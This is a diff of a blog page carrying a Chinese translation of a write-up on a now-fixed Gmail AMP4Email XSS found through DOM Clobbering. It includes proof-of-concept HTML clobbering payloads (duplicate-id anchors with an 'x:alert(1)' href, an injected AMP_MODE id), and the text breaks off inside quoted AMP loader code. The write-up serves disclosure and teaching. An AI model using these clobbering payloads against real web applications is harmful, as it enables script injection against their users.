@@ -23,7 +23,7 @@ LICENSE: MIT
  这篇文章是我在2019年8月通过Google 漏洞奖励计划报告的 AMP4Email 中已经修复的 XSS 的文章。该 XSS 是对著名浏览器问题 DOM Clobbering 的真实利用案例。
 什么是 AMP4Email AMP4Email（也称为动态邮件）是 Gmail 的一项新功能，可以让电子邮件包含动态 HTML 内容。尽管撰写包含 HTML 标签的电子邮件已经很多年了，但通常认为 HTML 仅包含静态内容，即某种格式，图像等，没有任何脚本或表单。 AMP4Email 打算更进一步，允许电子邮件中包含动态内容。 在Google 官方 G Suite 官方博客中的帖子中，对动态邮件的使用案例进行了很好的总结
  通过动态邮件，你可以轻松地直接从消息本身直接操作，例如对事件进行快速回复，填写问卷，浏览目录或回复评论。
-以在 Google 文档中进行评论为例。现在，你将不再在有人在评论中提及你时接收到单独的电子邮件通知，而是会在 Gmail 中看到最新的主题，你可以在邮件中直接从中轻松回复或解决评论。
+  以在 Google 文档中进行评论为例。现在，你将不再在有人在评论中提及你时接收到单独的电子邮件通知，而是会在 Gmail 中看到最新的主题，你可以在邮件中直接从中轻松回复或解决评论。
  该功能引发了一些明显的安全性问题。最重要的一个可能是：跨站点脚本（XSS）？如果我们允许电子邮件中包含动态内容，是否意味着我们可以轻松地注入任意 JavaScript 代码？好吧，答案是否定的；没那么容易。" />
 
   
@@ -39,7 +39,7 @@ LICENSE: MIT
  这篇文章是我在2019年8月通过Google 漏洞奖励计划报告的 AMP4Email 中已经修复的 XSS 的文章。该 XSS 是对著名浏览器问题 DOM Clobbering 的真实利用案例。
 什么是 AMP4Email AMP4Email（也称为动态邮件）是 Gmail 的一项新功能，可以让电子邮件包含动态 HTML 内容。尽管撰写包含 HTML 标签的电子邮件已经很多年了，但通常认为 HTML 仅包含静态内容，即某种格式，图像等，没有任何脚本或表单。 AMP4Email 打算更进一步，允许电子邮件中包含动态内容。 在Google 官方 G Suite 官方博客中的帖子中，对动态邮件的使用案例进行了很好的总结
  通过动态邮件，你可以轻松地直接从消息本身直接操作，例如对事件进行快速回复，填写问卷，浏览目录或回复评论。
-以在 Google 文档中进行评论为例。现在，你将不再在有人在评论中提及你时接收到单独的电子邮件通知，而是会在 Gmail 中看到最新的主题，你可以在邮件中直接从中轻松回复或解决评论。
+  以在 Google 文档中进行评论为例。现在，你将不再在有人在评论中提及你时接收到单独的电子邮件通知，而是会在 Gmail 中看到最新的主题，你可以在邮件中直接从中轻松回复或解决评论。
  该功能引发了一些明显的安全性问题。最重要的一个可能是：跨站点脚本（XSS）？如果我们允许电子邮件中包含动态内容，是否意味着我们可以轻松地注入任意 JavaScript 代码？好吧，答案是否定的；没那么容易。" />
   <meta property="og:url" content="https://madneal.com/post/xss/" />
   <meta property="og:image" content="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/img/avatar.jpg" />
@@ -47,7 +47,6 @@ LICENSE: MIT
 
 
 
-<meta name="generator" content="Hugo 0.46" />
 
 
 <link rel="canonical" href="https://madneal.com/post/xss/" />
@@ -233,233 +232,180 @@ LICENSE: MIT
       <h1 class="post-title">GMail XSS 漏洞分析</h1>
       <p class="post-meta">@Neal · Nov 24, 2019 · 4 min read</p>
     </header>
-    <article class="post-content">
-
-<blockquote>
+    <article class="post-content"><blockquote>
 <p>原文：<a href="https://research.securitum.com/xss-in-amp4email-dom-clobbering/">XSS in GMail’s AMP4Email via DOM Clobbering</a></p>
-
 <p>译者：<a href="https://github.com/neal1991">neal1991</a></p>
-
 <p>welcome to star my <a href="https://github.com/neal1991/articles-translator/">articles-translator</a>, providing you advanced articles translation. Any suggestion, please issue or contact <a href="mailto:bing@stu.ecnu.edu.cn">me</a></p>
-
 <p>LICENSE: <a href="https://opensource.org/licenses/MIT">MIT</a></p>
 </blockquote>
-
 <p>这篇文章是我在2019年8月通过<a href="https://www.google.com/about/appsecurity/reward-program/"> Google 漏洞奖励计划</a>报告的 AMP4Email 中已经修复的 XSS 的文章。该 XSS 是对著名浏览器问题 DOM Clobbering 的真实利用案例。</p>
-
 <h2 id="什么是-amp4email">什么是 AMP4Email</h2>
-
 <p>AMP4Email（也称为动态邮件）是 Gmail 的一项新功能，可以让电子邮件包含动态 HTML 内容。尽管撰写包含 HTML 标签的电子邮件已经很多年了，但通常认为 HTML 仅包含静态内容，即某种格式，图像等，没有任何脚本或表单。 AMP4Email 打算更进一步，允许电子邮件中包含动态内容。 在<a href="https://gsuiteupdates.googleblog.com/2019/06/dynamic-email-in-gmail-becoming-GA.html"> Google 官方 G Suite 官方博客中的帖子</a>中，对动态邮件的使用案例进行了很好的总结</p>
-
 <blockquote>
 <p><strong>通过动态邮件，你可以轻松地直接从消息本身直接操作，例如对事件进行快速回复，填写问卷，浏览目录或回复评论。</strong></p>
-
+</blockquote>
+<blockquote>
 <p><strong>以在 Google 文档中进行评论为例。现在，你将不再在有人在评论中提及你时接收到单独的电子邮件通知，而是会在 Gmail 中看到最新的主题，你可以在邮件中直接从中轻松回复或解决评论。</strong></p>
 </blockquote>
-
 <p>该功能引发了一些明显的安全性问题。最重要的一个可能是：跨站点脚本（XSS）？如果我们允许电子邮件中包含动态内容，是否意味着我们可以轻松地注入任意 JavaScript 代码？好吧，答案是否定的；没那么容易。</p>
-
 <p>AMP4Email 具有<a href="https://github.com/ampproject/amphtml/blob/master/validator/validator-main.protoascii">强验证器</a>，简而言之，它是允许在动态邮件中使用的标签和属性的强大白名单。你可以在 <a href="https://amp.gmail.dev/playground/">https://amp.gmail.dev/playground/</a> 上尝试，你还可以给自己发送动态电子邮件来研究工作原理！</p>
-
-<p><img src="https://s2.ax1x.com/2019/11/18/Mceabq.png" alt="Mceabq.png" />
+<p><img src="https://s2.ax1x.com/2019/11/18/Mceabq.png" alt="Mceabq.png">
 图1. AMP4Email playground</p>
-
 <p>如果你尝试添加验证器未明确允许的任何 HTML 元素或属性，则会收到错误消息。</p>
-
-<p><img src="https://s2.ax1x.com/2019/11/18/McmnWF.png" alt="McmnWF.png" />
+<p><img src="https://s2.ax1x.com/2019/11/18/McmnWF.png" alt="McmnWF.png">
 图2. AMP 验证器禁止使用任意脚本标签</p>
-
 <p>在使用 AMP4Email 并尝试各种方法绕过它时，我注意到标签中不允许 id 属性（图3）。</p>
-
-<p><img src="https://s2.ax1x.com/2019/11/18/McuZ2F.png" alt="McuZ2F.png" />
+<p><img src="https://s2.ax1x.com/2019/11/18/McuZ2F.png" alt="McuZ2F.png">
 图3.不允许使用属性 id</p>
-
 <p>这看起来像是开始安全分析的好地方，因为创建具有用户控制的id属性的HTML元素可能会导致 <a href="http://www.thespanner.co.uk/2013/05/16/dom-clobbering/">DOM Clobbering</a>。</p>
-
 <h2 id="dom-clobbering">DOM Clobbering</h2>
-
 <p>DOM Clobbering 是 web 浏览器的遗留功能，给许多应用程序带来麻烦。基本上，当你在 HTML 中创建一个元素（例如 <code>&lt;input id = username&gt;</code>），然后希望从 JavaScript 引用该元素时，通常会使用 <code>document.getElementById('username')</code> 或者 <code>document.querySelector('#username')</code> 之类的函数。但这不是唯一的方法！</p>
-
 <p>传统的方法是仅通过全局 <code>window</code> 对象的属性来访问它。因此，在这种情况下，<code>window.username</code> 与 <code>document.getElementById('username')</code> 完全相同！如果应用程序基于某些全局变量的存在做出决定（例如，<code>if（window.isAdmin）{...}</code>），则此行为（称为 DOM Cloberring）可能导致有趣的漏洞。</p>
-
 <p>为了进一步分析 DOM Clobbering，假设我们有以下 JavaScript 代码：</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">if</span> (window.<span style="color:#a6e22e">test1</span>.<span style="color:#a6e22e">test2</span>) {
-    eval(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">+</span>window.<span style="color:#a6e22e">test1</span>.<span style="color:#a6e22e">test2</span>)
-}
-</code></pre></div>
-<p>我们的工作是通过仅使用 DOM Cloberring 技术执行任意 JS 代码。要完成这个任务，我们需要找到两个问题的解决方案</p>
-
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (window.<span style="color:#a6e22e">test1</span>.<span style="color:#a6e22e">test2</span>) {
+</span></span><span style="display:flex;"><span>    eval(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">+</span>window.<span style="color:#a6e22e">test1</span>.<span style="color:#a6e22e">test2</span>)
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>我们的工作是通过仅使用 DOM Cloberring 技术执行任意 JS 代码。要完成这个任务，我们需要找到两个问题的解决方案</p>
 <ol>
 <li>我们知道可以在 <code>window</code> 上创建新属性，但是可以在其他对象上创建新属性（比如 <code>test1.test2</code>）吗？</li>
 <li>我们可以控制 DOM 元素如何转换为字符串吗？大多数 HTML 元素在转换为字符串时，返回的内容类似于 <code>[object HTMLInputElement]</code>。</li>
 </ol>
-
 <p>让我们从第一个问题开始。最常被引用的解决方法是使用 <code>&lt;form&gt;</code> 标签。标签 <code>&lt;form&gt;</code> 的每个子元素 <code>&lt;input&gt;</code> 都被添加为 <code>&lt;form&gt;</code> 的属性，该属性的名称和 <code>&lt;input&gt;</code> 的 <code>name</code> 属性相同。考虑以下示例：</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">test1</span>&gt;
-  &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">test2</span>&gt;
-&lt;/<span style="color:#f92672">form</span>&gt;
-&lt;<span style="color:#f92672">script</span>&gt;
-  <span style="color:#a6e22e">alert</span>(<span style="color:#a6e22e">test1</span>.<span style="color:#a6e22e">test2</span>); <span style="color:#75715e">// alerts &#34;[object HTMLInputElement]&#34;
-</span><span style="color:#75715e"></span>&lt;/<span style="color:#f92672">script</span>&gt;</code></pre></div>
-<p>为了解决第二个问题，我创建了一个简短的 JS 代码，该代码对 HTML 中所有可能的元素进行了迭代，并检查它们的 <code>toString</code> 方法是否继承自 <code>Object.prototype</code> 还是以其他方式定义的。如果它们不继承自<code>Object.prototype</code>，则可能会返回除 <code>[object SomeElement]</code> 外的其他内容。</p>
-
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">test1</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">test2</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">form</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">alert</span>(<span style="color:#a6e22e">test1</span>.<span style="color:#a6e22e">test2</span>); <span style="color:#75715e">// alerts &#34;[object HTMLInputElement]&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p>为了解决第二个问题，我创建了一个简短的 JS 代码，该代码对 HTML 中所有可能的元素进行了迭代，并检查它们的 <code>toString</code> 方法是否继承自 <code>Object.prototype</code> 还是以其他方式定义的。如果它们不继承自<code>Object.prototype</code>，则可能会返回除 <code>[object SomeElement]</code> 外的其他内容。</p>
 <p>代码如下：</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">Object.<span style="color:#a6e22e">getOwnPropertyNames</span>(window)
-.<span style="color:#a6e22e">filter</span>(<span style="color:#a6e22e">p</span> =&gt; <span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">match</span>(<span style="color:#e6db74">/Element$/</span>))
-.<span style="color:#a6e22e">map</span>(<span style="color:#a6e22e">p</span> =&gt; window[<span style="color:#a6e22e">p</span>])
-.<span style="color:#a6e22e">filter</span>(<span style="color:#a6e22e">p</span> =&gt; <span style="color:#a6e22e">p</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">prototype</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">toString</span> <span style="color:#f92672">!==</span> Object.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">toString</span>)
-</code></pre></div>
-<p>该代码返回两个元素：<code>HTMLAreaElement</code>（<code>&lt;area&gt;</code>）和 <code>HTMLAnchorElement</code>（<code>&lt;a&gt;</code>）。 AMP4Email 中不允许使用第一个，因此仅关注第二个。如果是 <code>&lt;a&gt;</code> 元素，则 <code>toString</code> 仅返回 <code>href</code> 属性的值。考虑示例：</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">test1</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">https://securitum.com</span>&gt;
-&lt;<span style="color:#f92672">script</span>&gt;
-  <span style="color:#a6e22e">alert</span>(<span style="color:#a6e22e">test1</span>); <span style="color:#75715e">// alerts &#34;https://securitum.com&#34;
-</span><span style="color:#75715e"></span>&lt;/<span style="color:#f92672">script</span>&gt;</code></pre></div>
-<p>在这一点上，似乎我们想解决最初的问题（比如通过 DOM Clobbering 获取 <code>window.test1.test2</code> 的值），我们需要类似于以下代码：</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">test1</span>&gt;
-  &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">test2</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;x:alert(1)&#34;</span>&gt;&lt;/<span style="color:#f92672">a</span>&gt;
-&lt;/<span style="color:#f92672">form</span>&gt;</code></pre></div>
-<p>问题在于它根本不起作用；<code>test1.test2</code> 将会是 <code>undefined</code>。 尽管 <code>&lt;input&gt;</code> 元素确实成为了 <code>&lt;form&gt;</code> 的属性，但 <code>&lt;a&gt;</code> 没有发生变化。</p>
-
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>Object.<span style="color:#a6e22e">getOwnPropertyNames</span>(window)
+</span></span><span style="display:flex;"><span>.<span style="color:#a6e22e">filter</span>(<span style="color:#a6e22e">p</span> =&gt; <span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">match</span>(<span style="color:#e6db74">/Element$/</span>))
+</span></span><span style="display:flex;"><span>.<span style="color:#a6e22e">map</span>(<span style="color:#a6e22e">p</span> =&gt; window[<span style="color:#a6e22e">p</span>])
+</span></span><span style="display:flex;"><span>.<span style="color:#a6e22e">filter</span>(<span style="color:#a6e22e">p</span> =&gt; <span style="color:#a6e22e">p</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">prototype</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">toString</span> <span style="color:#f92672">!==</span> Object.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">toString</span>)
+</span></span></code></pre></div><p>该代码返回两个元素：<code>HTMLAreaElement</code>（<code>&lt;area&gt;</code>）和 <code>HTMLAnchorElement</code>（<code>&lt;a&gt;</code>）。 AMP4Email 中不允许使用第一个，因此仅关注第二个。如果是 <code>&lt;a&gt;</code> 元素，则 <code>toString</code> 仅返回 <code>href</code> 属性的值。考虑示例：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">test1</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">https://securitum.com</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">alert</span>(<span style="color:#a6e22e">test1</span>); <span style="color:#75715e">// alerts &#34;https://securitum.com&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p>在这一点上，似乎我们想解决最初的问题（比如通过 DOM Clobbering 获取 <code>window.test1.test2</code> 的值），我们需要类似于以下代码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">test1</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">test2</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;x:alert(1)&#34;</span>&gt;&lt;/<span style="color:#f92672">a</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">form</span>&gt;
+</span></span></code></pre></div><p>问题在于它根本不起作用；<code>test1.test2</code> 将会是 <code>undefined</code>。 尽管 <code>&lt;input&gt;</code> 元素确实成为了 <code>&lt;form&gt;</code> 的属性，但 <code>&lt;a&gt;</code> 没有发生变化。</p>
 <p>这个问题有一个有趣的解决方法，不过仅仅适用于基于 WebKit 以及 Blink 内核的浏览器。假设我们有两个具有相同 id 的元素：</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">test1</span>&gt;click!&lt;/<span style="color:#f92672">a</span>&gt;
-&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">test1</span>&gt;click2!&lt;/<span style="color:#f92672">a</span>&gt;</code></pre></div>
-<p>那么访问 <code>window.test1</code> 时我们将得到什么？我直觉上希望得到具有该 id 的第一个元素（当你尝试调用<code>document.getElementById('#test1')</code> 时会发生这种情况。但是，在 Chromium 中，我们实际上得到了一个<code>HTMLCollection</code>！</p>
-
-<p><img src="https://s2.ax1x.com/2019/11/18/McKGoq.png" alt="McKGoq.png" />
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">test1</span>&gt;click!&lt;/<span style="color:#f92672">a</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">test1</span>&gt;click2!&lt;/<span style="color:#f92672">a</span>&gt;
+</span></span></code></pre></div><p>那么访问 <code>window.test1</code> 时我们将得到什么？我直觉上希望得到具有该 id 的第一个元素（当你尝试调用<code>document.getElementById('#test1')</code> 时会发生这种情况。但是，在 Chromium 中，我们实际上得到了一个<code>HTMLCollection</code>！</p>
+<p><img src="https://s2.ax1x.com/2019/11/18/McKGoq.png" alt="McKGoq.png">
 图4. window.test1 指向 HTMLCollection</p>
-
 <p>这里特别有趣的是（可以在图4中看到），我们可以通过索引（示例中的0和1）以及通过 id 访问该 HTMLCollection 中的特定元素。 这意味着 <code>window.test1.test1</code> 实际上是指第一个元素。 事实证明，设置 <code>name</code> 属性也会在 <code>HTMLCollection</code> 中创建新属性。 所以现在我们有以下代码：</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">test1</span>&gt;click!&lt;/<span style="color:#f92672">a</span>&gt;
-&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">test1</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">test2</span>&gt;click2!&lt;/<span style="color:#f92672">a</span>&gt;</code></pre></div>
-<p>我们可以通过 <code>window.test1.test2</code> 访问第二个锚元素。</p>
-
-<p><img src="https://s2.ax1x.com/2019/11/19/Mc53RA.png" alt="Mc53RA.png" />
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">test1</span>&gt;click!&lt;/<span style="color:#f92672">a</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">test1</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">test2</span>&gt;click2!&lt;/<span style="color:#f92672">a</span>&gt;
+</span></span></code></pre></div><p>我们可以通过 <code>window.test1.test2</code> 访问第二个锚元素。</p>
+<p><img src="https://s2.ax1x.com/2019/11/19/Mc53RA.png" alt="Mc53RA.png">
 图5. 我们可以定义 window.test1.test2</p>
-
 <p>因此，回到通过 DOM Clobbering 利用 <code>eval(''+ window.test1.test2)</code> 的原始练习，解决方案是：</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;test1&#34;</span>&gt;&lt;/<span style="color:#f92672">a</span>&gt;&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;test1&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;test2&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;x:alert(1)&#34;</span>&gt;&lt;/<span style="color:#f92672">a</span>&gt;</code></pre></div>
-<p>现在让我们回到 AMP4Email，看看如何在实际情况下如何利用 DOM Clobbering。</p>
-
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;test1&#34;</span>&gt;&lt;/<span style="color:#f92672">a</span>&gt;&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;test1&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;test2&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;x:alert(1)&#34;</span>&gt;&lt;/<span style="color:#f92672">a</span>&gt;
+</span></span></code></pre></div><p>现在让我们回到 AMP4Email，看看如何在实际情况下如何利用 DOM Clobbering。</p>
 <h2 id="在-amp4email-利用-dom-clobbering">在 AMP4Email 利用 DOM Clobbering</h2>
-
 <p>我已经提到过，通过向元素添加我自己的 id 属性，AMP4Email 可能容易受到 DOM Clobbering 的攻击。为了找到可利用的条件，我决定看一下 <code>window</code> 的属性（图6）。立即引起注意的是开头的 AMP。</p>
-
-<p><img src="https://s2.ax1x.com/2019/11/19/Mc5DRs.png" alt="Mc5DRs.png" />
+<p><img src="https://s2.ax1x.com/2019/11/19/Mc5DRs.png" alt="Mc5DRs.png">
 图6. window 全局对象的属性</p>
-
 <p>在这一点上，事实证明 AMP4Email 实际上对 DOM Clobbering 采取了某种保护措施，因为它严格禁止 id 属性的某些值，例如：<code>AMP</code>（图7）。</p>
-
-<p><img src="https://s1.ax1x.com/2019/11/19/MRVc2F.png" alt="MRVc2F.png" />
+<p><img src="https://s1.ax1x.com/2019/11/19/MRVc2F.png" alt="MRVc2F.png">
 图7. AMP 是 AMP4Email 中的 id 的无效值</p>
-
 <p>但是，AMP_MODE并没有发生相同的限制。所以我准备了一句代码 <code>&lt;a id=AMP_MODE&gt;</code> 看看会发生什么……</p>
-
 <p>…然后我注意到控制台中有一个非常有趣的错误（图8）。</p>
-
-<p><img src="https://s2.ax1x.com/2019/11/19/Mc5WoF.png" alt="Mc5WoF.png" />
+<p><img src="https://s2.ax1x.com/2019/11/19/Mc5WoF.png" alt="Mc5WoF.png">
 图8. 加载某些JS文件的 404 错误</p>
-
-<p>如图8 所示，AMP4Email 尝试加载某些JS文件，但由于 404 而未能加载。但是，特别引人注目的是，URL （<a href="https://cdn.ampproject.org/rtv/undefined/v0/amp-auto-lightbox-0.1.js）中存在">https://cdn.ampproject.org/rtv/undefined/v0/amp-auto-lightbox-0.1.js）中存在</a> <code>undefined</code>。我能够想出的唯一一个合理的解释：AMP 尝试获取 <code>AMP_MODE</code> 的属性以将其放入URL。由于 DOM Clobbering，缺少了预期的属性，因此是 <code>undefined</code>。包含代码的代码如下所示：</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">preloadExtension</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">a</span>, <span style="color:#a6e22e">b</span>) {
-            <span style="color:#e6db74">&#34;amp-embed&#34;</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;amp-ad&#34;</span>);
-            <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">c</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fn</span>(<span style="color:#66d9ef">this</span>, <span style="color:#a6e22e">a</span>, <span style="color:#f92672">!</span><span style="color:#ae81ff">1</span>);
-            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">loaded</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">error</span>)
-                <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">d</span> <span style="color:#f92672">=</span> <span style="color:#f92672">!</span><span style="color:#ae81ff">1</span>;
-            <span style="color:#66d9ef">else</span>
-                <span style="color:#66d9ef">void</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">scriptPresent</span> <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#a6e22e">d</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">win</span>.document.<span style="color:#a6e22e">head</span>.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">&#39;[custom-element=&#34;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&#34;]&#39;</span>),
-                <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">scriptPresent</span> <span style="color:#f92672">=</span> <span style="color:#f92672">!!</span><span style="color:#a6e22e">d</span>),
-                <span style="color:#a6e22e">d</span> <span style="color:#f92672">=</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">scriptPresent</span>;
-            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">d</span>) {
-                <span style="color:#a6e22e">d</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">b</span>;
-                <span style="color:#a6e22e">b</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">win</span>.document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#34;script&#34;</span>);
-                <span style="color:#a6e22e">b</span>.<span style="color:#66d9ef">async</span> <span style="color:#f92672">=</span> <span style="color:#f92672">!</span><span style="color:#ae81ff">0</span>;
